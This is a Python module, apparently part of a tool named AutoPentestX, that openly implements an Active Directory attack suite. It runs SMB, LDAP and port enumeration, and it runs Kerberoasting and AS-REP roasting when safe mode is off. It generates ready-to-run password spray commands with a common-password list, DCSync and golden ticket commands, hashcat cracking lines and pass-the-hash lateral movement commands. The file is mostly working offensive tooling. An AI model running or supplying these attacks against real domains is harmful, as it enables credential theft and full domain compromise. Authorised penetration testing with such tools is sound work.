#!/usr/bin/env python3
"""
AutoPentestX - Active Directory Attack Module
Red Team: Kerberoasting, AS-REP Roasting, SMB enumeration,
LDAP enumeration, password spray simulation, DCSync vectors,
BloodHound data collection templates, and AD path analysis.
"""

import subprocess
import socket
import json
import re
import os
import struct
import concurrent.futures
from datetime import datetime

R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; B = '\033[1m'; X = '\033[0m'


class ADAttackSuite:
    """
    Comprehensive Active Directory attack suite for Red Team operations.
    Covers enumeration, Kerberos attacks, SMB/LDAP recon, and lateral movement prep.
    Requires network access to DC. Runs in detection/simulation mode by default.
    """

    # Common AD service ports
    AD_PORTS = {
        53:   'DNS',
        88:   'Kerberos',
        135:  'RPC',
        139:  'NetBIOS',
        389:  'LDAP',
        445:  'SMB',
        464:  'Kerberos Password Change',
        636:  'LDAPS',
        3268: 'Global Catalog LDAP',
        3269: 'Global Catalog LDAPS',
        5985: 'WinRM HTTP',
        5986: 'WinRM HTTPS',
        9389: 'AD Web Services',
    }

    # Common AD user accounts to probe
    COMMON_AD_USERS = [
        'administrator', 'admin', 'guest', 'krbtgt', 'svc_sql', 'svc_web',
        'svc_backup', 'svc_deploy', 'svc_ldap', 'svc_scan', 'helpdesk',
        'support', 'service', 'backup', 'monitoring', 'nagios', 'zabbix',
        'jenkins', 'gitlab', 'ansible', 'puppet', 'chef', 'salt',
    ]

    # Kerberoastable service class patterns
    KERBEROASTABLE_SPNS = [
        'MSSQLSvc/', 'HTTP/', 'CIFS/', 'HOST/', 'ldap/', 'smtp/', 'ftp/',
        'imap/', 'pop3/', 'DNS/', 'NFS/', 'FTP/', 'WSMAN/', 'MSExchangeMBX/',
        'MSExchangeRFR/', 'MSExchangeMTA/', 'MSExchangeSA/', 'Exchange/',
        'VPNConfig/', 'termsrv/', 'oracle/', 'GC/', 'rpc/',
    ]

    # Password spray wordlist (most common enterprise passwords)
    SPRAY_PASSWORDS = [
        'Password1', 'Password123', 'Password1!', 'Welcome1', 'Welcome123',
        'Admin123', 'P@ssw0rd', 'P@ssword1', 'Passw0rd', 'Summer2024',
        'Winter2024', 'Spring2024', 'Fall2024', 'Company123', 'Company1!',
        'January2024', 'February2024', 'March2024', 'April2024', 'May2024',
        'Qwerty123', 'Qwerty1!', 'changeme', 'changeme1', 'changeme123',
        'monkey123', 'dragon123', 'letmein1', 'abc123456', '1qaz2wsx',
    ]

    def __init__(self, target: str, domain: str = None, dc_ip: str = None,
                 username: str = None, password: str = None, safe_mode: bool = True):
        self.target = target
        self.domain = domain or self._guess_domain(target)
        self.dc_ip = dc_ip or target
        self.username = username
        self.password = password
        self.safe_mode = safe_mode
        self.results = {
            'target': target,
            'domain': self.domain,
            'dc_ip': self.dc_ip,
            'timestamp': datetime.now().isoformat(),
            'ad_services': {},
            'domain_info': {},
            'users': [],
            'groups': [],
            'computers': [],
            'spns': [],
            'kerberoastable': [],
            'asrep_roastable': [],
            'smb_shares': [],
            'smb_info': {},
            'password_policy': {},
            'spray_results': [],
            'attack_paths': [],
            'bloodhound_commands': [],
        }

    def _guess_domain(self, target: str) -> str:
        parts = target.split('.')
        return '.'.join(parts[-2:]) if len(parts) >= 2 else target

    def _print(self, level: str, msg: str):
        icons = {'info': f'{C}[*]{X}', 'ok': f'{G}[✓]{X}',
                 'warn': f'{Y}[!]{X}', 'vuln': f'{R}[AD]{X}',
                 'find': f'{M}[+]{X}'}
        print(f'  {icons.get(level, "[?]")} {msg}')

    def _run_cmd(self, cmd: list, timeout: int = 30) -> str:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return ''
        except FileNotFoundError:
            return ''
        except Exception:
            return ''

    # ─────────────────────────────────────────────────────────
    #  1. AD SERVICE DETECTION
    # ─────────────────────────────────────────────────────────
    def detect_ad_services(self) -> dict:
        self._print('info', f'Detecting Active Directory services on {self.dc_ip}...')
        detected = {}

        def probe_port(port):
            try:
                with socket.create_connection((self.dc_ip, port), timeout=3):
                    return port, True
            except Exception:
                return port, False

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
            for port, reachable in pool.map(probe_port, self.AD_PORTS.keys()):
                service = self.AD_PORTS[port]
                detected[port] = {'service': service, 'reachable': reachable}
                if reachable:
                    self._print('find', f'Port {Y}{port}{X}/tcp open — {G}{service}{X}')

        kerberos_up = detected.get(88, {}).get('reachable', False)
        ldap_up = detected.get(389, {}).get('reachable', False)
        smb_up = detected.get(445, {}).get('reachable', False)

        if kerberos_up and ldap_up:
            self._print('find', f'{R}Active Directory Domain Controller confirmed!{X}')
            detected['is_dc'] = True
        elif smb_up:
            self._print('find', f'{Y}SMB host detected (potential domain member){X}')
            detected['is_dc'] = False

        self.results['ad_services'] = detected
        return detected

    # ─────────────────────────────────────────────────────────
    #  2. SMB ENUMERATION
    # ─────────────────────────────────────────────────────────
    def enumerate_smb(self) -> dict:
        self._print('info', f'Enumerating SMB on {self.dc_ip}...')
        smb_data = {'host': self.dc_ip, 'shares': [], 'users': [],
                    'domain_info': {}, 'os_info': ''}

        # Try enum4linux-ng first, fallback to smbclient/rpcclient
        tools_tried = []

        # enum4linux-ng
        out = self._run_cmd(['enum4linux-ng', '-A', '-oA', '/tmp/enum4linux', self.dc_ip], timeout=120)
        if out and 'Domain Name' in out:
            tools_tried.append('enum4linux-ng')
            domain_match = re.search(r'Domain Name:\s*(\S+)', out)
            os_match = re.search(r'OS:\s*(.+)', out)
            if domain_match:
                smb_data['domain_info']['name'] = domain_match.group(1)
                self._print('find', f'Domain: {G}{domain_match.group(1)}{X}')
            if os_match:
                smb_data['os_info'] = os_match.group(1).strip()
                self._print('find', f'OS: {G}{smb_data["os_info"]}{X}')

        # smbclient null session share listing
        null_out = self._run_cmd(['smbclient', '-L', f'//{self.dc_ip}/', '-N'], timeout=20)
        if null_out:
            share_pattern = re.compile(r'^\s+(\S+)\s+(Disk|IPC|Printer)', re.MULTILINE)
            for match in share_pattern.finditer(null_out):
                share_name = match.group(1)
                share_type = match.group(2)
                smb_data['shares'].append({'name': share_name, 'type': share_type,
                                           'null_session': True})
                self._print('find', f'SMB Share: {Y}{share_name}{X} [{share_type}] (null session)')

        # rpcclient null session
        rpc_out = self._run_cmd(['rpcclient', '-U', '', '--no-pass', self.dc_ip,
                                  '-c', 'enumdomusers'], timeout=20)
        if rpc_out and 'user:[' in rpc_out:
            user_pattern = re.compile(r'user:\[(\S+)\]')
            for match in user_pattern.finditer(rpc_out):
                uname = match.group(1)
                smb_data['users'].append(uname)
                self._print('find', f'Domain user: {G}{uname}{X}')

        # Password policy via rpcclient
        pp_out = self._run_cmd(['rpcclient', '-U', '', '--no-pass', self.dc_ip,
                                 '-c', 'getdompwinfo'], timeout=20)
        if pp_out:
            min_len = re.search(r'min_password_length:\s*(\d+)', pp_out)
            lockout = re.search(r'lockout_threshold:\s*(\d+)', pp_out)
            if min_len:
                self.results['password_policy']['min_length'] = int(min_len.group(1))
                self._print('find', f'Password min length: {Y}{min_len.group(1)}{X}')
            if lockout:
                self.results['password_policy']['lockout_threshold'] = int(lockout.group(1))
                self._print('find', f'Lockout threshold: {Y}{lockout.group(1)}{X}')
                if int(lockout.group(1)) == 0:
                    self._print('vuln', f'{R}No account lockout policy!{X} Password spray safe.')

        self.results['smb_info'] = smb_data
        self.results['smb_shares'] = smb_data['shares']
        if smb_data['users']:
            self.results['users'].extend(smb_data['users'])
        return smb_data

    # ─────────────────────────────────────────────────────────
    #  3. LDAP ENUMERATION
    # ─────────────────────────────────────────────────────────
    def enumerate_ldap(self) -> dict:
        self._print('info', f'Enumerating LDAP on {self.dc_ip}...')
        ldap_data = {'base_dn': '', 'users': [], 'computers': [], 'groups': []}

        # Attempt anonymous LDAP bind
        ldap_out = self._run_cmd([
            'ldapsearch', '-x', '-h', self.dc_ip, '-b', '',
            '-s', 'base', 'namingContexts'
        ], timeout=15)

        base_dn = ''
        if ldap_out:
            match = re.search(r'namingContexts:\s*(DC=\S+)', ldap_out)
            if match:
                base_dn = match.group(1)
                ldap_data['base_dn'] = base_dn
                self._print('find', f'LDAP Base DN: {G}{base_dn}{X}')

        # If credentials available, do full enum
        if self.username and self.password and base_dn:
            # User enumeration
            user_out = self._run_cmd([
                'ldapsearch', '-x', '-h', self.dc_ip,
                '-D', f'{self.username}@{self.domain}',
                '-w', self.password,
                '-b', base_dn,
                '(objectClass=user)',
                'sAMAccountName', 'servicePrincipalName', 'userAccountControl',
                'memberOf', 'description', 'lastLogon', 'pwdLastSet'
            ], timeout=60)

            if user_out:
                # Extract users
                for match in re.finditer(r'sAMAccountName:\s*(\S+)', user_out):
                    uname = match.group(1)
                    if uname not in ldap_data['users']:
                        ldap_data['users'].append(uname)

                # Extract SPNs (Kerberoastable accounts)
                for match in re.finditer(
                    r'sAMAccountName:\s*(\S+).*?servicePrincipalName:\s*(\S+)',
                    user_out, re.DOTALL
                ):
                    uname = match.group(1)
                    spn = match.group(2)
                    self.results['spns'].append({'user': uname, 'spn': spn})
                    self.results['kerberoastable'].append(uname)
                    self._print('vuln', f'{R}Kerberoastable:{X} {Y}{uname}{X} SPN={C}{spn}{X}')

                # UAC flags: DONT_REQUIRE_PREAUTH = 4194304 (AS-REP roastable)
                for match in re.finditer(
                    r'sAMAccountName:\s*(\S+).*?userAccountControl:\s*(\d+)',
                    user_out, re.DOTALL
                ):
                    uname = match.group(1)
                    uac = int(match.group(2))
                    if uac & 4194304:  # DONT_REQUIRE_PREAUTH
                        self.results['asrep_roastable'].append(uname)
                        self._print('vuln', f'{R}AS-REP Roastable:{X} {Y}{uname}{X} (no preauth required)')

        self.results['domain_info'].update(ldap_data)
        return ldap_data

    # ─────────────────────────────────────────────────────────
    #  4. KERBEROASTING SIMULATION
    # ─────────────────────────────────────────────────────────
    def kerberoast(self) -> dict:
        self._print('info', 'Attempting Kerberoasting...')
        results = {'method': 'kerberoasting', 'tickets': [], 'commands': []}

        # Generate Impacket GetUserSPNs command
        if self.username and self.password:
            cmd = (f'python3 GetUserSPNs.py {self.domain}/{self.username}:{self.password} '
                   f'-dc-ip {self.dc_ip} -request -outputfile kerberoast_hashes.txt')
            results['commands'].append({'tool': 'impacket', 'command': cmd})
            self._print('find', f'Kerberoast command: {C}{cmd}{X}')

            # Try to actually run it if impacket is available
            if not self.safe_mode:
                out = self._run_cmd(cmd.split(), timeout=60)
                if '$krb5tgs$' in out:
                    for match in re.finditer(r'(\$krb5tgs\$\S+)', out):
                        ticket = match.group(1)
                        results['tickets'].append(ticket)
                        self._print('vuln', f'{R}TGS Ticket captured!{X} Hash: {ticket[:60]}...')

        # Rubeus alternative
        results['commands'].append({
            'tool': 'Rubeus (Windows)',
            'command': 'Rubeus.exe kerberoast /outfile:hashes.txt /simple'
        })

        # Hashcat cracking command
        if results['tickets']:
            results['hashcat_cmd'] = 'hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt'
            self._print('find', f'Crack with: {Y}hashcat -m 13100 kerberoast_hashes.txt rockyou.txt{X}')

        self.results['kerberoast_results'] = results
        return results

    # ─────────────────────────────────────────────────────────
    #  5. AS-REP ROASTING
    # ─────────────────────────────────────────────────────────
    def asrep_roast(self) -> dict:
        self._print('info', 'Attempting AS-REP Roasting...')
        results = {'method': 'asrep_roasting', 'hashes': [], 'commands': []}

        # Test common usernames without Kerberos pre-auth
        test_users = self.results.get('asrep_roastable', []) or self.COMMON_AD_USERS[:10]

        if not self.safe_mode:
            # Use impacket GetNPUsers
            for user in test_users:
                cmd = ['python3', 'GetNPUsers.py',
                       f'{self.domain}/', '-usersfile', '/dev/stdin',
                       '-no-pass', '-dc-ip', self.dc_ip]
                out = self._run_cmd(cmd, timeout=30)
                if '$krb5asrep$' in out:
                    for match in re.finditer(r'(\$krb5asrep\$\S+)', out):
                        h = match.group(1)
                        results['hashes'].append({'user': user, 'hash': h})
                        self._print('vuln', f'{R}AS-REP Hash:{X} {Y}{user}{X}: {h[:60]}...')

        # Generate commands for manual use
        users_file_cmd = f'echo "{chr(10).join(test_users)}" > users.txt'
        impacket_cmd = f'python3 GetNPUsers.py {self.domain}/ -usersfile users.txt -no-pass -dc-ip {self.dc_ip} -outputfile asrep_hashes.txt'
        hashcat_cmd = 'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt'
        rubeus_cmd = 'Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt'

        results['commands'] = [
            {'tool': 'impacket', 'command': f'{users_file_cmd} && {impacket_cmd}'},
            {'tool': 'Rubeus', 'command': rubeus_cmd},
            {'tool': 'hashcat (crack)', 'command': hashcat_cmd},
        ]
        for cmd_entry in results['commands']:
            self._print('find', f'{M}{cmd_entry["tool"]}{X}: {C}{cmd_entry["command"][:80]}{X}')

        self.results['asrep_results'] = results
        return results

    # ─────────────────────────────────────────────────────────
    #  6. PASSWORD SPRAY SIMULATION
    # ─────────────────────────────────────────────────────────
    def password_spray_simulation(self, users: list = None, passwords: list = None) -> list:
        self._print('info', 'Preparing password spray attack...')
        users = users or self.results.get('users', self.COMMON_AD_USERS[:15])
        passwords = passwords or self.SPRAY_PASSWORDS[:5]

        lockout_threshold = self.results.get('password_policy', {}).get('lockout_threshold', 5)
        self._print('info', f'Lockout threshold: {lockout_threshold} | '
                            f'Users: {len(users)} | Passwords: {len(passwords)}')

        if lockout_threshold > 0 and len(passwords) >= lockout_threshold:
            self._print('warn', f'{Y}Password count ({len(passwords)}) near lockout threshold ({lockout_threshold})!{X}')
            self._print('warn', 'Limiting to 1 password per spray round in safe mode')
            passwords = passwords[:1]

        spray_commands = []
        for pwd in passwords:
            cmds = {
                'password': pwd,
                'crackmapexec': f'crackmapexec smb {self.dc_ip} -u users.txt -p "{pwd}" --continue-on-success',
                'sprayhound':   f'sprayhound -u users.txt -p "{pwd}" -d {self.domain} --dc {self.dc_ip}',
                'kerbrute':     f'kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} users.txt "{pwd}"',
                'impacket':     f'python3 smbclient.py {self.domain}/USER:{pwd}@{self.dc_ip}',
            }
            spray_commands.append(cmds)
            self._print('find', f'Spray: {Y}"{pwd}"{X} → CrackMapExec command ready')

        if not self.safe_mode:
            self._print('warn', f'{R}SAFE MODE OFF — Actual spray would execute here{X}')

        self.results['spray_results'] = spray_commands
        return spray_commands

    # ─────────────────────────────────────────────────────────
    #  7. DCSYNC ATTACK VECTORS
    # ─────────────────────────────────────────────────────────
    def dcsync_analysis(self) -> dict:
        self._print('info', 'Analyzing DCSync attack vectors...')
        dcsync = {
            'requires': 'Domain Admin, Enterprise Admin, or Replication rights',
            'commands': {},
            'description': 'DCSync replicates all domain hashes including krbtgt',
        }

        if self.username and self.password:
            dcsync['commands']['impacket_all'] = (
                f'python3 secretsdump.py {self.domain}/{self.username}:{self.password}'
                f'@{self.dc_ip} -just-dc'
            )
            dcsync['commands']['impacket_krbtgt'] = (
                f'python3 secretsdump.py {self.domain}/{self.username}:{self.password}'
                f'@{self.dc_ip} -just-dc-user krbtgt'
            )

        dcsync['commands']['mimikatz'] = (
            'lsadump::dcsync /domain:{} /user:krbtgt'.format(self.domain)
        )
        dcsync['commands']['mimikatz_all'] = (
            'lsadump::dcsync /domain:{} /all /csv'.format(self.domain)
        )

        # Golden ticket generation
        dcsync['golden_ticket_cmd'] = {
            'mimikatz': (
                'kerberos::golden /domain:{domain} /sid:DOMAIN_SID /rc4:KRBTGT_NTLM_HASH '
                '/user:Administrator /id:500 /ticket:golden.kirbi'
            ).format(domain=self.domain),
            'impacket': (
                'python3 ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID '
                '-domain {domain} Administrator'.format(domain=self.domain)
            ),
        }

        for cmd_name, cmd in dcsync['commands'].items():
            self._print('find', f'DCSync {M}{cmd_name}{X}: {C}{cmd[:80]}{X}')

        self.results['dcsync_info'] = dcsync
        return dcsync

    # ─────────────────────────────────────────────────────────
    #  8. BLOODHOUND COLLECTION COMMANDS
    # ─────────────────────────────────────────────────────────
    def generate_bloodhound_commands(self) -> list:
        self._print('info', 'Generating BloodHound collection commands...')
        commands = []

        if self.username and self.password:
            creds = f'{self.domain}/{self.username}:{self.password}'
        else:
            creds = f'{self.domain}/<user>:<pass>'

        cmds = [
            {
                'tool': 'BloodHound-python (remote)',
                'command': f'python3 bloodhound.py -d {self.domain} -u {self.username or "USER"} -p "{self.password or "PASS"}" -ns {self.dc_ip} -c All',
            },
            {
                'tool': 'SharpHound (Windows, all methods)',
                'command': 'SharpHound.exe -c All --zipfilename bloodhound_data.zip',
            },
            {
                'tool': 'SharpHound (stealth)',
                'command': 'SharpHound.exe -c DCOnly --stealth --outputdirectory C:\\Windows\\Temp',
            },
            {
                'tool': 'impacket (computer list)',
                'command': f'python3 GetADUsers.py -all {creds} -dc-ip {self.dc_ip}',
            },
            {
                'tool': 'ldapdomaindump',
                'command': f'ldapdomaindump {self.dc_ip} -u \'{self.domain}\\{self.username or "USER"}\' -p \'{self.password or "PASS"}\' --no-html',
            },
        ]

        for cmd_entry in cmds:
            commands.append(cmd_entry)
            self._print('find', f'{M}{cmd_entry["tool"]}{X}: {C}{cmd_entry["command"][:80]}{X}')

        self.results['bloodhound_commands'] = commands
        return commands

    # ─────────────────────────────────────────────────────────
    #  9. LATERAL MOVEMENT TECHNIQUES
    # ─────────────────────────────────────────────────────────
    def lateral_movement_techniques(self, cred_type: str = 'plaintext') -> list:
        self._print('info', f'Generating lateral movement options (cred_type={cred_type})...')
        techniques = []

        user = self.username or 'USER'
        pwd = self.password or 'PASS'
        dom = self.domain

        if cred_type in ('plaintext', 'both'):
            techniques += [
                {'name': 'WinRM (evil-winrm)', 'cmd': f'evil-winrm -i {self.dc_ip} -u {user} -p "{pwd}"'},
                {'name': 'SMBexec', 'cmd': f'python3 smbexec.py {dom}/{user}:{pwd}@{self.dc_ip}'},
                {'name': 'Wmiexec', 'cmd': f'python3 wmiexec.py {dom}/{user}:{pwd}@{self.dc_ip}'},
                {'name': 'Psexec', 'cmd': f'python3 psexec.py {dom}/{user}:{pwd}@{self.dc_ip}'},
                {'name': 'ATExec', 'cmd': f'python3 atexec.py {dom}/{user}:{pwd}@{self.dc_ip} whoami'},
                {'name': 'DCOM (dcomexec)', 'cmd': f'python3 dcomexec.py {dom}/{user}:{pwd}@{self.dc_ip}'},
                {'name': 'RDP (xfreerdp)', 'cmd': f'xfreerdp /v:{self.dc_ip} /u:{user} /p:"{pwd}" /cert:ignore'},
                {'name': 'SSH (if enabled)', 'cmd': f'ssh {user}@{self.dc_ip}'},
            ]

        if cred_type in ('hash', 'both'):
            hash_ph = '<NTLM_HASH>'
            techniques += [
                {'name': 'Pass-the-Hash (WMI)', 'cmd': f'python3 wmiexec.py -hashes :{hash_ph} {dom}/{user}@{self.dc_ip}'},
                {'name': 'Pass-the-Hash (SMB)', 'cmd': f'python3 smbexec.py -hashes :{hash_ph} {dom}/{user}@{self.dc_ip}'},
                {'name': 'Pass-the-Hash (PSexec)', 'cmd': f'python3 psexec.py -hashes :{hash_ph} {dom}/{user}@{self.dc_ip}'},
                {'name': 'CrackMapExec PTH', 'cmd': f'crackmapexec smb {self.dc_ip} -u {user} -H {hash_ph} -x "whoami"'},
                {'name': 'Evil-WinRM PTH', 'cmd': f'evil-winrm -i {self.dc_ip} -u {user} -H {hash_ph}'},
                {'name': 'Pass-the-Ticket (Mimikatz)', 'cmd': 'kerberos::ptt ticket.kirbi'},
            ]

        for t in techniques:
            self._print('find', f'{M}{t["name"]}{X}: {C}{t["cmd"][:70]}{X}')

        self.results['lateral_movement'] = techniques
        return techniques

    # ─────────────────────────────────────────────────────────
    #  10. PRIVILEGE ESCALATION VECTORS
    # ─────────────────────────────────────────────────────────
    def privesc_vectors(self) -> list:
        self._print('info', 'Identifying privilege escalation vectors...')
        vectors = [
            {'name': 'Kerberoasting', 'condition': len(self.results.get('kerberoastable', [])) > 0,
             'desc': 'Service accounts with SPNs can have TGS tickets cracked offline'},
            {'name': 'AS-REP Roasting', 'condition': len(self.results.get('asrep_roastable', [])) > 0,
             'desc': 'Users with no preauth required can be cracked offline'},
            {'name': 'No Lockout Policy', 'condition': self.results.get('password_policy', {}).get('lockout_threshold', 1) == 0,
             'desc': 'Unlimited password spray attempts without lockout'},
            {'name': 'Null SMB Session', 'condition': bool(self.results.get('smb_shares')),
             'desc': 'Anonymous SMB access may expose sensitive shares'},
            {'name': 'LDAP Anonymous Bind', 'condition': bool(self.results.get('domain_info', {}).get('base_dn')),
             'desc': 'Anonymous LDAP reveals domain structure'},
        ]

        active_vectors = [v for v in vectors if v['condition']]
        for v in active_vectors:
            self._print('vuln', f'{R}{v["name"]}{X}: {v["desc"]}')

        inactive = [v for v in vectors if not v['condition']]
        for v in inactive:
            self._print('info', f'{G}Not vulnerable:{X} {v["name"]}')

        self.results['privesc_vectors'] = active_vectors
        return active_vectors

    # ─────────────────────────────────────────────────────────
    #  ORCHESTRATION
    # ─────────────────────────────────────────────────────────
    def run_full_ad_attack(self) -> dict:
        print(f'\n{C}╔══════════════════════════════════════════════════════════╗{X}')
        print(f'{C}║{X} {B}{M}[AD ATTACK SUITE]{X} Domain: {Y}{self.domain}{X}  DC: {Y}{self.dc_ip}{X}')
        print(f'{C}║{X} {Y}Safe Mode: {"[✓] ON" if self.safe_mode else "[✗] OFF"}{X}')
        print(f'{C}╚══════════════════════════════════════════════════════════╝{X}\n')

        self.detect_ad_services()
        self.enumerate_smb()
        self.enumerate_ldap()
        self.kerberoast()
        self.asrep_roast()
        self.password_spray_simulation()
        self.dcsync_analysis()
        self.generate_bloodhound_commands()
        self.lateral_movement_techniques(cred_type='both')
        self.privesc_vectors()

        self.results['completed_at'] = datetime.now().isoformat()

        kerberoastable = len(self.results.get('kerberoastable', []))
        asrep = len(self.results.get('asrep_roastable', []))
        shares = len(self.results.get('smb_shares', []))
        print(f'\n{G}[✓]{X} AD attack suite complete — '
              f'{R}{kerberoastable}{X} Kerberoastable | '
              f'{R}{asrep}{X} AS-REP Roastable | '
              f'{Y}{shares}{X} SMB shares')

        return self.results
